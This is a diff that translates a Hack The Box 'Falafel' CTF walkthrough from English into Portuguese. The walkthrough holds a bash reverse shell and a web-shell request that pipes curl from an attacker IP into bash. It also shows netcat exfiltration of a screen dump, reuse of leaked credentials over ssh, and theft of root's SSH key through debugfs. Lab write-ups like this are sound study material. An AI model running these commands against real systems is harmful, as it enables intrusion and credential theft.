@@ -335,7 +335,7 @@ cp shell.png $(msf-pattern_create -l 251).png
 
 bash -i &gt;&amp; /dev/tcp/10.10.14.17/443 0&gt;&amp;1
 </code></pre>
-<p>Partilhe então um servidor http com este ficheiro, afim de através do RCE, dar um curl ao ficheiro, e pipeá-lo com bash</p>
+<p>Partilhe então um servidor http com este ficheiro, para que através do RCE, poder dar um curl ao ficheiro, e pipeá-lo com bash</p>
 <pre><code class="language-bash">sudo python3 -m http.server 80  # On one terminal
 sudo nc -lvnp 443               # On another one
 </code></pre>
@@ -343,7 +343,7 @@ sudo nc -lvnp 443               # On another one
 <p>http://10.10.10.73/uploads/0909-2054_bd1a63d419ed6bf6/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php?cmd=curl%20http://10.10.14.17/rev.html|bash</p>
 </blockquote>
 <h2 id="privesc"><a class="header" href="#privesc">PrivEsc</a></h2>
-<p>We found credentials on /var/www/html/connection.php</p>
+<p>Já dentro da máquina, ao vasculhar os ficheiros, pode-se encontrar credenciais em /var/www/html/connection.php</p>
 <pre><code class="language-bash">(remote) www-data@falafel:/var/www/html$ cat connection.php
 &lt;?php
    define('DB_SERVER', 'localhost:3306');
@@ -358,34 +358,35 @@ sudo nc -lvnp 443               # On another one
    }
 ?&gt;
 </code></pre>
-<p>This credentials is for mysql. but if we try to logon as moshe:falafelIsReallyTasty, we will get in.</p>
+<p>Estas credenciais server para fazer login ao MySQL, mas se reutilizar-mos as credenciais para fazer login por ssh, vemos que as credenciais são válidas!</p>
 <h3 id="group-video"><a class="header" href="#group-video">Group video</a></h3>
-<p>This machine's is a ctf lool. But is interessante the way to escalate privilege. This machine are no more vulnerability... The password is on the screen of the machine. So, how we can screenshot this?</p>
-<p>with &quot;w&quot; command we can see the user yossi is logged physically on the machine</p>
+<p>Esta máquina é um CaptureTheFlag LOL... O próximo passo é completamente irrealista, mas não deixa de ser interessante. Esta máquina não tem mais vulnerabilidades. Ok, então onde estão as credenciais do usuário &quot;yossi&quot;?! Estão no ecrã...</p>
+<p>com o commando &quot;w&quot; podemos ver que o yossi está actualmente logado fisicamente na máquina</p>
 <pre><code class="language-bash">w
 #&gt;   22:31:32 up 10:23,  2 users,  load average: 0.00, 0.00, 0.00
 #&gt;  USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 #&gt;  yossi    tty1                      12:08   10:22m  0.06s  0.06s -bash
 #&gt;  moshe    pts/1    10.10.14.17      22:06    0.00s  0.06s  0.00s w
 </code></pre>
-<p>The video group has access to view the screen output. Basically you can observe the the screens. In order to do that you need to grab the current image on the screen in raw data and get the resolution that the screen is using. The screen data can be saved in /dev/fb0 and you could find the resolution of this screen on /sys/class/graphics/fb0/virtual_size</p>
+<p>O usuário com o qual estamos neste momento (moshe) está no grupo &quot;video&quot;. Os usuário deste grupo pode ver o que está a ser transmitido para o ecrã. E para tirar uma captura de ecrã sem nenhum recurso adicional, pode-se ir à fonte mesmo. Isto é, capturar o que está em /dev/fb0 com um simples cat. Para ler este arquivo (que vem em formato RAW), temos de saber as dimenções da tela, pois este formato não diz nada sobre dimenções, apenas escreve todos os dados numa linha só e &quot;tá feito&quot;. As dimenções actuais do ecrã estão sempre definidas em /sy/class/graphics/fb0/virtual_size</p>
 <pre><code class="language-bash">cat /dev/fb0 &gt; /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 #&gt; 1176,885
 </code></pre>
-<p>Download the screen.raw into kali machine</p>
+<p>Recupere a captura de ecrã para o kali</p>
 <pre><code class="language-bash">nc 10.10.14.17 443 &lt; /tmp/screen.raw  # Target Machine
 nc -lvnp 443 &gt; screen.raw             # kali Machine
 </code></pre>
-<p>open with GIMP in mode RAW</p>
+<p>Abrir o ficheiro com ajuda do GIMP, definido manualmente que este ficheiro é um ficheiro RAW com 1176,885 de dimenções...</p>
 <p><img src="Assets/HTB-Linux-Hard-Falafel/Openning_raw_image.png" alt="opennig image raw format with GIMP" /></p>
 <p><img src="Assets/HTB-Linux-Hard-Falafel/select_size_raw_image.png" alt="Select size of raw image" /></p>
 <p><img src="Assets/HTB-Linux-Hard-Falafel/yossi_password.png" alt="Password yossi" /></p>
-<p>We can now ssh into target machine with yossi user</p>
+<p>Entre agora por ssh com o usuário yossi e a sua credencial (que de passagem só se vê porque o yossi errou primeiro ao introduzi-la e por &quot;grande sorte&quot; ainda está a vista na tela looooool)</p>
 <h3 id="group-disk"><a class="header" href="#group-disk">Group disk</a></h3>
 <pre><code class="language-bash">for group in $(groups); do echo -e &quot;\n\n\n[*] Archive with group $group permition:\n&quot;; find / -group $group 2&gt;/dev/null; done
 </code></pre>
-<p>When we run this, we see yossi have permition on /dev/sda1 and more...</p>
+<p>Este commando permite-nos enumerar todos os ficheiro no qual pertence a cada grupo no qual está o usuário. E assim, vemos que o usuário yossio em que estamos logados, tem permissões através do grupo &quot;disk&quot; de leitura e escritura sobre /dev/sda1 e muito mais...</p>
+<p>Este /dev/sda1 é muito simplesmente o disco rígido na qual está instalado o prórpio sistema operativo. Mas não dá para abrir assim...</p>
 <pre><code class="language-bash">fdisk -l
 #&gt;  Disk /dev/sda: 8 GiB, 8589934592 bytes, 16777216 sectors
 #&gt;  Units: sectors of 1 * 512 = 512 bytes
@@ -403,9 +404,8 @@ nc -lvnp 443 &gt; screen.raw             # kali Machine
 ll /dev/sda1
 #&gt;  brw-rw---- 1 root disk 8, 1 Sep  9 12:08 /dev/sda1
 </code></pre>
-<p>Group disk can read and write on /dev/sda1. But how?</p>
 <h3 id="debugfs"><a class="header" href="#debugfs">debugfs</a></h3>
-<p>debugfs - ext2/ext3/ext4 file system debugger. Display or manipulate a disk partition table. We can see easily the flag, but we want to be root!</p>
+<p>Com a ajuda da ferramente debugfs (ext2/ext3/ext4 file system debugger). Podemos ver ou manipular uma partição, um disco ou o seu conteúdo. Podemos assim facilemente ver a flag root.txt, mas a nós o que nos interessa é vir a ser root! Por sorte, em /root/.ssh existem keys para entrar por ssh, já autorizadas... nem percisamos de fazer mais nada. É só copiar e usar a id_rsa:</p>
 <pre><code class="language-bash">debugfs /dev/sda1
 debugfs: cd /root/.ssh
 debugfs: cat id_rsa  # copy the content...
